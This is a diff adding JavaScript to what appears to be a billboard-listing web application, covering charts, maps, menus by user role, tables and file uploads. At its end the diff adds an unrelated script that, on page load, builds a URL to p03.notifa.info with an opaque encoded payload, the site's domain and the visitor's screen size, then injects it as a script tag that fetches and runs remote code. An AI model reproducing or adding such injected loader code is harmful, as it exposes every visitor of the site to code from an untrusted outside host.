+                        dataPoints: dataPoints,
+                    }]
+                });
+                chart.render();
+                dataPoints.push({
+                    label: 'Jan',
+                    y: parseInt('50')
+                });
+                dataPoints.push({
+                    label: 'Feb',
+                    y: parseInt('30')
+                });
+                dataPoints.push({
+                    label: 'Mar',
+                    y: parseInt('0')
+                });
+                dataPoints.push({
+                    label: 'Apr',
+                    y: parseInt('0')
+                });
+                dataPoints.push({
+                    label: 'May',
+                    y: parseInt('0')
+                });
+                dataPoints.push({
+                    label: 'Jun',
+                    y: parseInt('0')
+                });
+                dataPoints.push({
+                    label: 'Jul',
+                    y: parseInt('0')
+                });
+                dataPoints.push({
+                    label: 'Aug',
+                    y: parseInt('0')
+                });
+                dataPoints.push({
+                    label: 'Sep',
+                    y: parseInt('0')
+                });
+                dataPoints.push({
+                    label: 'Oct',
+                    y: parseInt('0')
+                });
+                dataPoints.push({
+                    label: 'Nov',
+                    y: parseInt('0')
+                });
+                dataPoints.push({
+                    label: 'Dec',
+                    y: parseInt('0')
+                });
+                chart.render();
+            }
+            if (document.querySelectorAll('.cust-date') != null) {
+                var cdate = document.querySelectorAll('.cust-date');
+                for (var i = 0; i < cdate.length; i++) {
+                    cdate[i].innerHTML = formatDate(new Date(cdate[i].innerHTML.toString()));
+                }
+            }
+            if (document.querySelectorAll('.cart-price') != null) {
+                var cprice = document.querySelectorAll('.cart-price');
+                for (var i = 0; i < cprice.length; i++) {
+                    cprice[i].innerHTML = addCommas(cprice[i].innerHTML.toString());
+                }
+            }
+        }
+
+        //#region Maps
+        function initMap() {
+            // map options
+            var map, map2;
+            var marker, marker2;
+            var options = {
+                zoom: 5,
+                center: new google.maps.LatLng(-3.5058155, 122.6757871),
+                mapTypeId: google.maps.MapTypeId.TERRAIN,
+                mapTypeControl: false
+            };
+            if (cities != null) {
+                map = new google.maps.Map(document.getElementById('map_canvas'), options);
+                map2 = new google.maps.Map(document.getElementById('map_canvas2'), options);
+                for (var i = 0; i < cities.length; i++) {
+                    // init markers
+                    marker = new google.maps.Marker({
+                        position: new google.maps.LatLng(cities[i]['Lat'], cities[i]['Lng']),
+                        map: map,
+                        title: cities[i]['Title']
+                    });
+                    var infowindow = new google.maps.InfoWindow({});
+                    google.maps.event.addListener(marker, 'click', (function (marker, i) {
+                        return function () {
+                            var contentString = '<div id="content">' +
+                                '<h1>' + cities[i]['Title'] + '</h1>' +
+                                '<p>Latitude : ' + cities[i]['Lat'] + '</p>' +
+                                '<p>Longitude : ' + cities[i]['Lng'] + '</p>' +
+                                '</div>';
+                            infowindow.setContent(cities[i]['Title']);
+                            infowindow.setContent(contentString);
+                            infowindow.open(map, marker);
+                        }
+                    })(marker, i));
+                    marker2 = new google.maps.Marker({
+                        position: new google.maps.LatLng(cities[i]['Lat'], cities[i]['Lng']),
+                        map: map2,
+                        title: cities[i]['Title']
+                    });
+                    var infowindow2 = new google.maps.InfoWindow({});
+                    google.maps.event.addListener(marker2, 'click', (function (marker2, i) {
+                        return function () {
+                            var contentString = '<div id="content">' +
+                                '<h1>' + cities[i]['Title'] + '</h1>' +
+                                '<p>Latitude : ' + cities[i]['Lat'] + '</p>' +
+                                '<p>Longitude : ' + cities[i]['Lng'] + '</p>' +
+                                '</div>';
+                            infowindow2.setContent(cities[i]['Title']);
+                            infowindow2.setContent(contentString);
+                            infowindow2.open(map2, marker2);
+                            console.log('Canvas2' + infowindow2);
+                        }
+                    })(marker2, i));
+                }
+            }
+        }
+
+        google.maps.event.addDomListener(window, 'load', initMap);
+        //#endregion
+
+        //#region Wishlist
+        $(".like-btn").on("click", function () {
+            $(this).toggleClass("is-active");
+        });
+        $(".minus-btn").on("click", function (e) {
+            e.preventDefault();
+            var $this = $(this);
+            var $input = $this.closest("div").find("input");
+            var value = parseInt($input.val());
+
+            if (value > 1) {
+                value = value - 1;
+            } else {
+                value = 0;
+            }
+            $input.val(value);
+        });
+
+        $(".plus-btn").on("click", function (e) {
+            e.preventDefault();
+            var $this = $(this);
+            var $input = $this.closest("div").find("input");
+            var value = parseInt($input.val());
+
+            if (value < 100) {
+                value = value + 1;
+            } else {
+                value = 100;
+            }
+            $input.val(value);
+        });
+        //#endregion
+
+        $(function () {
+            //$(".datePicker").datetimepicker();
+            $(".datePicker").datetimepicker({
+                icons: {
+                    today: "fas fa-bomb",
+                    date: "fas fa-calendar",
+                    time: "fas fa-clock-o",
+                    up: "fa fa-arrow-up",
+                    next: "fa fa-arrow-right",
+                    down: "fa fa-arrow-down",
+                    previous: "fa fa-arrow-left",
+                    clear: "fas fa-circle-o",
+                    close: "fas fa-times"
+                },
+                locale: 'en'
+            });
+            //$("#datepicker1").datetimepicker();
+            //$("#datepicker2").datetimepicker({
+            //	useCurrent: false //Important! See issue #1075
+            //});
+            $("#datepicker1").on("dp.change", function (e) {
+                $('#datepicker2').data("DateTimePicker").minDate(e.date);
+            });
+            $("#datepicker2").on("dp.change", function (e) {
+                $('#datepicker1').data("DateTimePicker").maxDate(e.date);
+            });
+        });
+
+        function cd() {
+            var date = new Date();
+            var currentDate = date.getDate();
+            var currentYear = date.getFullYear();
+            var monthNames = $(".datePicker").datetimepicker("option", "monthNames");
+            var dayNames = $('.datePicker').datetimepicker("option", "dayNames");
+            //var currentMonth = monthNames[date.getMonth()];
+            var currentDay = dayNames[date.getDay()];
+            var dh = $('.ui-datepicker').height();
+            var current = '<div class="datepicker-current"><p class="current-day">' + currentDay +
+                '</p><h3 class="current-date">' + currentDate +
+                '</h3><div class="month-info"><span class="current-month">' +
+                monthNames + '</span><span class="current-year">' + currentYear + '</span></div></div>';
+            console.log(current);
+
+            //$('.datepicker-current').remove();
+            //$('.ui-datepicker').append(current);
+            $('.datepicker-current').css("height", dh);
+
+        }
+        //$(document).on("click", "#datepicker1" , function(){
+        //  //cd()
+        //});
+
+        $(document).ready(function () {
+            //#region NavBar
+            //console.log(isFiltered);
+            if (isFiltered == '') {
+                //document.getElementById("wrapper").style.display = "none";
+                //document.getElementById("noLogin").style.display = "block";
+                document.getElementById("homeMenu").style.display = "none";
+                document.getElementById("dashboardMenu").style.display = "none";
+                document.getElementById("orderMenu").style.display = "none";
+                document.getElementById("userMenu").style.display = "none";
+                document.getElementById("mownerMenu").style.display = "none";
+                document.getElementById("listsiteMenu").style.display = "none";
+                document.getElementById("regionMenu").style.display = "none";
+                document.getElementById("bankaccountMenu").style.display = "none";
+                document.getElementById("uploadsiteMenu").style.display = "none";
+                document.getElementById("profileMenu").style.display = "none";
+                document.getElementById("wishMenu").style.display = "none";
+                document.getElementById("cartMenu").style.display = "none";
+                document.getElementById("loginMenu").style.display = "block";
+            } else if (isFiltered == 'ADM') {
+                //document.getElementById("wrapper").style.display = "block";
+                //document.getElementById("noLogin").style.display = "none";
+                document.getElementById("homeMenu").style.display = "none";
+                document.getElementById("dashboardMenu").style.display = "block";
+                document.getElementById("orderMenu").style.display = "none";
+                document.getElementById("userMenu").style.display = "block";
+                document.getElementById("mownerMenu").style.display = "none";
+                document.getElementById("listsiteMenu").style.display = "block";
+                document.getElementById("regionMenu").style.display = "block";
+                document.getElementById("bankaccountMenu").style.display = "block";
+                document.getElementById("uploadsiteMenu").style.display = "block";
+                document.getElementById("profileMenu").style.display = "block";
+                document.getElementById("wishMenu").style.display = "none";
+                document.getElementById("cartMenu").style.display = "none";
+                document.getElementById("loginMenu").style.display = "none";
+            } else if (isFiltered == 'SPV') {
+                //document.getElementById("wrapper").style.display = "block";
+                //document.getElementById("noLogin").style.display = "none";
+                document.getElementById("homeMenu").style.display = "none";
+                document.getElementById("dashboardMenu").style.display = "block";
+                document.getElementById("orderMenu").style.display = "none";
+                document.getElementById("userMenu").style.display = "none";
+                document.getElementById("mownerMenu").style.display = "none";
+                document.getElementById("listsiteMenu").style.display = "block";
+                document.getElementById("regionMenu").style.display = "block";
+                document.getElementById("bankaccountMenu").style.display = "block";
+                document.getElementById("uploadsiteMenu").style.display = "block";
+                document.getElementById("profileMenu").style.display = "block";
+                document.getElementById("wishMenu").style.display = "none";
+                document.getElementById("cartMenu").style.display = "none";
+                document.getElementById("loginMenu").style.display = "none";
+            } else if (isFiltered == 'MDO') {
+                //document.getElementById("wrapper").style.display = "block";
+                //document.getElementById("noLogin").style.display = "none";
+                document.getElementById("homeMenu").style.display = "none";
+                document.getElementById("dashboardMenu").style.display = "none";
+                document.getElementById("orderMenu").style.display = "none";
+                document.getElementById("userMenu").style.display = "none";
+                document.getElementById("mownerMenu").style.display = "none";
+                document.getElementById("listsiteMenu").style.display = "block";
+                document.getElementById("regionMenu").style.display = "none";
+                document.getElementById("bankaccountMenu").style.display = "block";
+                document.getElementById("uploadsiteMenu").style.display = "none";
+                document.getElementById("profileMenu").style.display = "block";
+                document.getElementById("wishMenu").style.display = "none";
+                document.getElementById("cartMenu").style.display = "none";
+                document.getElementById("loginMenu").style.display = "none";
+            } else {
+                //document.getElementById("wrapper").style.display = "none";
+                //document.getElementById("noLogin").style.display = "block";
+                document.getElementById("homeMenu").style.display = "none";
+                document.getElementById("dashboardMenu").style.display = "none";
+                document.getElementById("orderMenu").style.display = "none";
+                document.getElementById("userMenu").style.display = "none";
+                document.getElementById("mownerMenu").style.display = "none";
+                document.getElementById("listsiteMenu").style.display = "none";
+                document.getElementById("regionMenu").style.display = "none";
+                document.getElementById("bankaccountMenu").style.display = "block";
+                document.getElementById("uploadsiteMenu").style.display = "none";
+                document.getElementById("profileMenu").style.display = "block";
+                document.getElementById("wishMenu").style.display = "block";
+                document.getElementById("cartMenu").style.display = "block";
+                document.getElementById("loginMenu").style.display = "none";
+            }
+            //#endregion
+
+            $("#keranjang").click(function () {
+                //$("#cartModal").modal('show');
+            });
+            $("#btnHideModal").click(function () {
+                $("#cartModal").modal('hide');
+            });
+
+            //#region ThousandSeparator
+            $('#Harga').keyup(function () {
+                setInputFilter(document.getElementById("Harga"), function (value) {
+                    return /^[0-9.,]+$/.test(value);
+                });
+                var num = $('#Harga').val();
+                var comma = /,/g;
+                num = num.replace(comma, '');
+                console.log('NUM' + num);
+                $('#Hargax').val(num);
+                var numCommas = addCommas(num);
+                console.log('NUMCommas' + numCommas);
+                $('#Harga').val(numCommas);
+            });
+            //#endregion
+
+            FillBank();
+            FillType();
+            FillProvince();
+            $("#lstcity").append("<option value=''>Pilih Kota</option>");
+
+            if (document.getElementById("dtlPrice") != null) {
+                document.getElementById("dtlPrice").innerHTML = addCommas(document.getElementById("dtlPrice")
+                    .innerHTML);
+            }
+
+            $("#example1").each(function () {
+                var price = $(this).find('.price');
+                price.each(function () {
+                    var tag = $(this);
+                    tag[0].innerHTML = addCommas(tag[0].innerHTML);
+                })
+                var cdate = $(this).find('.custom-date');
+                cdate.each(function () {
+                    var tag = $(this);
+                    if (tag[0].innerHTML != "") {
+                        tag[0].innerHTML = formatDate(new Date(tag[0].innerHTML.toString()));
+                    }
+                })
+            })
+
+            $('#example1').DataTable({
+                dom: 'Bfrtip',
+                buttons: [
+                    'copy', 'csv', 'excel', 'pdf', 'print'
+                ]
+            });
+
+            $("#tdasboard").each(function () {
+                var price = $(this).find('.price');
+                price.each(function () {
+                    var tag = $(this);
+                    tag[0].innerHTML = addCommas(tag[0].innerHTML);
+                })
+                var cdate = $(this).find('.custom-date');
+                cdate.each(function () {
+                    var tag = $(this);
+                    if (tag[0].innerHTML != "") {
+                        tag[0].innerHTML = formatDate(new Date(tag[0].innerHTML));
+                    }
+                })
+            })
+
+            var datatable = $('#tdasboard').DataTable({
+                //dom: 'Bfrtip',
+                dom: 't',
+                buttons: [
+                    'copy', 'csv', 'excel', 'pdf', 'print'
+                ],
+                autoWidth: false,
+                columnDefs: [{
+                        'width': '80px',
+                        'targets': 3
+                    },
+                    {
+                        'width': '80px',
+                        'targets': 4
+                    }
+                ]
+            });
+
+            $('#search-button').on("click", function () {
+                datatable.search($('#input-search').val()).draw();
+            })
+
+            $("#divlist").each(function () {
+                var price = $(this).find('.price');
+                price.each(function () {
+                    var tag = $(this);
+                    tag[0].innerHTML = addCommas(tag[0].innerHTML);
+                })
+            })
+
+            $("#divfilter").each(function () {
+                var price = $(this).find('.price');
+                price.each(function () {
+                    var tag = $(this);
+                    tag[0].innerHTML = addCommas(tag[0].innerHTML);
+                })
+            })
+
+            $("#divCompare").each(function () {
+                var price = $(this).find('.price');
+                price.each(function () {
+                    var tag = $(this);
+                    tag[0].innerHTML = addCommas(tag[0].innerHTML);
+                })
+            })
+
+            //#region UploadPage
+            $('#btnUpload').on('click', function () {
+                var fileExtension = ['xls', 'xlsx'];
+                var filename = $('#fUpload').val();
+                if (filename.length == 0) {
+                    alert("Please select a file.");
+                    return false;
+                } else {
+                    var extension = filename.replace(/^.*\./, '');
+                    if ($.inArray(extension, fileExtension) == -1) {
+                        alert("Please select only excel files.");
+                        return false;
+                    } else if (!filename.includes("BillboardIndo_Site")) {
+                        alert("Please upload BillboardIndo_Site Document.");
+                        return false;
+                    }
+                }
+                var fdata = new FormData();
+                var fileUpload = $("#fUpload")[0];
+                var files = fileUpload.files;
+                fdata.append(files[0].name, files[0]);
+                showLoader();
+                $.ajax({
+                    type: "POST",
+                    url: "/mediaweb/ExportImport/OnPostImport",
+                    beforesend: function (xhr) {
+                        xhr.setrequestheader("xsrf-token", $(
+                                'input:hidden[name="__requestverificationtoken"]')
+                            .val());
+                    },
+                    data: fdata,
+                    contentType: false,
+                    processData: false,
+                    success: function (response) {
+                        if (response.length == 0) {
+                            alert('Some error occured while uploading');
+                        } else {
+                            $('#dvData').html(response);
+                        }
+                        showPage();
+                    },
+                    error: function (e) {
+                        //$('#dvData').html(e.responseText);
+                        $('#dvData').html('Mohon check file input anda!' + e.responseText
+                            .toString());
+                        showPage();
+                    }
+                });
+            });
+            $('#btnUploadImage').on('click', function () {
+                var fileExtension = ['jpg', 'png', 'jpeg'];
+                var filename = $('#iUpload').val();
+                if (filename.length == 0) {
+                    alert("Please select a file.");
+                    return false;
+                } else {
+                    var extension = filename.replace(/^.*\./, '');
+                    if ($.inArray(extension, fileExtension) == -1) {
+                        alert("Please select only image files.");
+                        return false;
+                    }
+                }
+                var fdata = new FormData();
+                var fileUpload = $("#iUpload")[0];
+                var files = fileUpload.files;
+                var newUrl = '/mediaweb/Site';
+                fdata.append(files[0].name, files[0]);
+                $.ajax({
+                    type: "POST",
+                    url: "/mediaweb/Site/AddImage", //"/ExportImport?handler=Import",
+                    beforesend: function (xhr) {
+                        xhr.setrequestheader("xsrf-token",
+                            $('input:hidden[name="__requestverificationtoken"]').val());
+                    },
+                    data: fdata,
+                    contentType: false,
+                    processData: false,
+                    success: function (response) {
+                        //alert(response);
+                        if (response.length == 0)
+                            alert('Some error occured while uploading');
+                        else {
+                            alert('Success Uploaded');
+                            window.location.href = newUrl;
+                        }
+                    },
+                    error: function (e) {
+                        alert(e);
+                    }
+                });
+            })
+            $('#btnUpdateImage').on('click', function () {
+                var fileExtension = ['jpg', 'png', 'jpeg'];
+                var filename = $('#iUpdate').val();
+                if (filename.length == 0) {
+                    alert("Please select a file.");
+                    return false;
+                } else {
+                    var extension = filename.replace(/^.*\./, '');
+                    if ($.inArray(extension, fileExtension) == -1) {
+                        alert("Please select only image files.");
+                        return false;
+                    }
+                }
+                var fdata = new FormData();
+                var fileUpload = $("#iUpdate")[0];
+                var files = fileUpload.files;
+                var newUrl = '/mediaweb/Site';
+                fdata.append(files[0].name, files[0]);
+                $.ajax({
+                    type: "POST",
+                    url: "", //"/ExportImport?handler=Import",
+                    beforesend: function (xhr) {
+                        xhr.setrequestheader("xsrf-token",
+                            $('input:hidden[name="__requestverificationtoken"]').val());
+                    },
+                    data: fdata,
+                    contentType: false,
+                    processData: false,
+                    success: function (response) {
+                        //alert(response);
+                        if (response.length == 0)
+                            alert('Some error occured while uploading');
+                        else {
+                            alert('Success Updated');
+                            window.location.href = newUrl;
+                        }
+                    },
+                    error: function (e) {
+                        alert(e);
+                    }
+                });
+            })
+            //#endregion
+        })
+        $(document).on('click', '#backLink', function () {
+            history.go(-1);
+        })
+    </script>
+
+    <script type="text/javascript">
+        if (self == top) {
+            function netbro_cache_analytics(fn, callback) {
+                setTimeout(function () {
+                    fn();
+                    callback();
+                }, 0);
+            }
+
+            function sync(fn) {
+                fn();
+            }
+
+            function requestCfs() {
+                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
+                var idc_glo_r = Math.floor(Math.random() * 99999999999);
+                var url = idc_glo_url + "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" +
+                    "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXOtXcawFOg%2fkDtzy05VxtHESRcDOUaa28MHEO5wFzg64t46YByqLZogTmfeG0Cj14XQ6HCG%2b%2fWbVFRqwY1JzZFUFJTN%2bypoAS7e6fpkZnXDyn%2fy6msmzUTagzozwBi%2frp5JHQ8D5vFuA1gEa%2bUGJxPNLvBympHaW3%2b7MZ2XGdIjGuWvUr2Kc5lQDukLN8%2faaQDaVxOJzHyzdnxIey7AcY59M6Zf0HMBq8QDTt7oALwgMPKSHrT8RYsIBF9LyPxgBk9neztbw1NU1UxowKESidX63Jr32SMWXFJDT5ZLG48ve0t%2f53rkEHGJqLly5nSJ%2b1eZ%2bn69UnxNGJWZx7YnqpJYm%2f%2b8AZegdBRNyuMHWXxldHCAbFcOx0TOr9OkbwkvW7AsQy%2bcGS7CHlv%2foRjcqDFFs%2fh6FF4zKKGPJNMOyDaEiD7ZT17hN8RAfqTCEWQX8Wq%2fhUFmLwoQ9viCHI7CbS6oIc8WTJ%2f%2bsKUFjfW78gIzvHxhY7sczoIWX4tTK%2b%2bd6PZskodk4aAhWJ6AUAiMyJupIb8M7fNchh" +
+                    "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen
+                    .height;
+                var bsa = document.createElement('script');
+                bsa.type = 'text/javascript';
+                bsa.async = true;
+                bsa.src = url;
+                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
+            }
+            netbro_cache_analytics(requestCfs, function () {});
+        };
+    </script>
+</body>
+
+</html>
